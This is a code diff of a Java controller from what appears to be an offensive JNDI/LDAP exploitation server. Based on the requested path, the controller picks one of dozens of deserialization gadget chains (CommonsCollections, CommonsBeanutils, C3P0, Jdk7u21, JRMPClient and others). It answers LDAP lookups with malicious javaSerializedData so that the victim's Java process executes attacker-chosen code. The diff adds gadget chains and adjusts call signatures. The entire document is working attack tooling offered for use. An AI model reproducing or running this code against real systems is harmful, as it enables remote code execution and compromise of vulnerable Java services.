@@ -14,7 +14,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-@LdapMapping(uri = { "/deserialization" })
+@LdapMapping(uri = {"/deserialization"})
 public class SerializedDataController implements LdapController {
     private GadgetType  gadgetType;
     private PayloadType payloadType;
@@ -22,12 +22,12 @@ public class SerializedDataController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
+        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
 
         //这个方法里面有改动，其他基本无改动
-        Entry e = new Entry(base);
+        Entry  e     = new Entry(base);
         byte[] bytes = null;
-        switch (gadgetType){
+        switch (gadgetType) {
             case urldns:
                 bytes = URLDNS.getBytes(params[0]);
                 break;
@@ -38,22 +38,22 @@ public class SerializedDataController implements LdapController {
                 bytes = CommonsBeanutils2.getBytes(payloadType, params);
                 break;
             case commonsbeanutils3:
-                bytes = CommonsBeanutils3.getBytes(payloadType, params);
+                bytes = CommonsBeanutils3.getBytes(payloadType);
                 break;
             case commonsbeanutils2nocc:
                 bytes = CommonsBeanutils2NOCC.getBytes(payloadType, params);
                 break;
             case commonsbeanutils3183:
-                bytes = CommonsBeanutils3183.getBytes(payloadType, params);
+                bytes = CommonsBeanutils3183.getBytes(payloadType);
                 break;
             case commonsbeanutils1183nocc:
                 bytes = CommonsBeanutils1183NOCC.getBytes(payloadType, params);
                 break;
             case commonscollections1:
-                bytes = CommonsCollections1.getBytes(payloadType, params);
+                bytes = CommonsCollections1.getBytes(payloadType);
                 break;
             case commonscollections1_1:
-                bytes = CommonsCollections1_1.getBytes(payloadType, params);
+                bytes = CommonsCollections1_1.getBytes(payloadType);
                 break;
             case commonscollections2:
                 bytes = CommonsCollections2.getBytes(payloadType, params);
@@ -65,16 +65,25 @@ public class SerializedDataController implements LdapController {
                 bytes = CommonsCollections4.getBytes(payloadType, params);
                 break;
             case commonscollections5:
-                bytes = CommonsCollections5.getBytes(payloadType, params);
+                bytes = CommonsCollections5.getBytes(payloadType);
                 break;
             case commonscollections6:
-                bytes = CommonsCollections6.getBytes(payloadType, params);
+                bytes = CommonsCollections6.getBytes(payloadType);
                 break;
             case commonscollections7:
-                bytes = CommonsCollections7.getBytes(payloadType, params);
+                bytes = CommonsCollections7.getBytes(payloadType);
                 break;
             case commonscollections7lite_4:
-                bytes = CommonsCollections7Lite_4.getBytes(payloadType, params);
+                bytes = CommonsCollections7Lite.getBytes(payloadType);
+                break;
+            case commonscollections8:
+                bytes = CommonsCollections8.getBytes(payloadType, params);
+                break;
+            case commonscollections9:
+                bytes = CommonsCollections9.getBytes(payloadType);
+                break;
+            case commonscollections10:
+                bytes = CommonsCollections10.getBytes(payloadType, params);
                 break;
             case commonscollectionsk1:
                 bytes = CommonsCollectionsK1.getBytes(payloadType, params);
@@ -82,11 +91,11 @@ public class SerializedDataController implements LdapController {
             case commonscollectionsk2:
                 bytes = CommonsCollectionsK2.getBytes(payloadType, params);
                 break;
-            case commonscollectionsk3:
-                bytes = CommonsCollectionsK3.getBytes(payloadType, params);
+            case commonscollections6lite:
+                bytes = CommonsCollections6Lite.getBytes(payloadType, params);
                 break;
-            case commonscollectionsk4:
-                bytes = CommonsCollectionsK4.getBytes(payloadType, params);
+            case commonscollections6lite_4:
+                bytes = CommonsCollections6Lite_4.getBytes(payloadType);
                 break;
             case jdk7u21:
                 bytes = Jdk7u21.getBytes(payloadType, params);
@@ -95,22 +104,35 @@ public class SerializedDataController implements LdapController {
                 bytes = Jre8u20.getBytes(payloadType, params);
                 break;
             case c3p0:
-                bytes = C3P0.getBytes(payloadType, params);
+                bytes = C3P0.getBytes(payloadType);
+                break;
+            case c3p02:
+                bytes = C3P02.getBytes(payloadType);
+                break;
+            case c3p03:
+                bytes = C3P03.getBytes(payloadType);
+                break;
+            case c3p04:
+                bytes = C3P04.getBytes(payloadType);
+                break;
+            case signedobject:
+                SignedObject signedObject = new SignedObject();
+                bytes = signedObject.getBytes(payloadType);
                 break;
             case aspectjweaver:
-                bytes = AspectJWeaver.getBytes(payloadType, params);
+                bytes = AspectJWeaver.getBytes(payloadType);
                 break;
             case beanshell1:
-                bytes = BeanShell1.getBytes(payloadType, params);
+                bytes = BeanShell1.getBytes(payloadType);
                 break;
             case c3p092:
-                bytes = C3P092.getBytes(payloadType, params);
+                bytes = C3P092.getBytes(payloadType);
                 break;
             case click1:
                 bytes = Click1.getBytes(payloadType, params);
                 break;
             case clojure:
-                bytes = Clojure.getBytes(payloadType, params);
+                bytes = Clojure.getBytes(payloadType);
                 break;
             case cve_2020_2555:
                 bytes = CVE_2020_2555.getBytes(payloadType, params);
@@ -119,19 +141,19 @@ public class SerializedDataController implements LdapController {
                 bytes = CVE_2020_2883.getBytes(payloadType, params);
                 break;
             case jython1:
-                bytes = Jython1.getBytes(payloadType, params);
+                bytes = Jython1.getBytes(payloadType);
                 break;
             case json:
                 bytes = JSON1.getBytes(payloadType, params);
                 break;
             case groovy1:
-                bytes = Groovy1.getBytes(payloadType, params);
+                bytes = Groovy1.getBytes(payloadType);
                 break;
             case hibernate1:
                 bytes = Hibernate1.getBytes(payloadType, params);
                 break;
             case hibernate2:
-                bytes = Hibernate2.getBytes(payloadType, params);
+                bytes = Hibernate2.getBytes(payloadType);
                 break;
             case javassistweld1:
                 bytes = JavassistWeld1.getBytes(payloadType, params);
@@ -143,38 +165,38 @@ public class SerializedDataController implements LdapController {
                 bytes = Jdk7u21variant.getBytes(payloadType, params);
                 break;
             case jrmpclient:
-                bytes = JRMPClient.getBytes(payloadType, params);
+                bytes = JRMPClient.getBytes(payloadType);
                 break;
             case jrmpclient_activator:
-                bytes = JRMPClient_Activator.getBytes(payloadType, params);
+                bytes = JRMPClient_Activator.getBytes(payloadType);
                 break;
             case jrmpclient_obj:
-                bytes = JRMPClient_Obj.getBytes(payloadType, params);
+                bytes = JRMPClient_Obj.getBytes(payloadType);
                 break;
             case jrmplistener:
-                bytes = JRMPListener.getBytes(payloadType, params);
+                bytes = JRMPListener.getBytes(payloadType);
                 break;
         }
 
         e.addAttribute("javaClassName", "foo");
-        e.addAttribute("javaSerializedData",bytes);
+        e.addAttribute("javaSerializedData", bytes);
         result.sendSearchEntry(e);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
     }
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
-        try{
-            int firstIndex = base.indexOf("/");
+        try {
+            int firstIndex  = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
-            try{
+            try {
                 gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                 System.out.println("[+] GaddgetType >> " + gadgetType);
-            }catch(IllegalArgumentException e){
+            } catch (IllegalArgumentException e) {
                 throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
 
-            if(gadgetType == GadgetType.urldns){
+            if (gadgetType == GadgetType.urldns) {
                 String url = "http://" + base.substring(base.lastIndexOf("/") + 1);
                 System.out.println("[+] URL >> " + url);
                 params = new String[]{url};
@@ -182,15 +204,15 @@ public class SerializedDataController implements LdapController {
             }
 
             int thirdIndex = base.indexOf("/", secondIndex + 1);
-            if(thirdIndex < 0) thirdIndex = base.length();
-            try{
+            if (thirdIndex < 0) thirdIndex = base.length();
+            try {
                 payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                 System.out.println("[+] PayloadType >> " + payloadType);
-            }catch (IllegalArgumentException e){
+            } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
 
-            switch(payloadType){
+            switch (payloadType) {
                 case dnslog:
                     String url = base.substring(base.lastIndexOf("/") + 1);
                     System.out.println("[+] URL >> " + url);
@@ -209,9 +231,9 @@ public class SerializedDataController implements LdapController {
                     break;
             }
 
-        }catch(Exception e){
-            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
-            if(e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException)e;
+        } catch (Exception e) {
+            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
+            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;
 
             throw new IncorrectParamsException("Incorrect params >> " + base);
         }
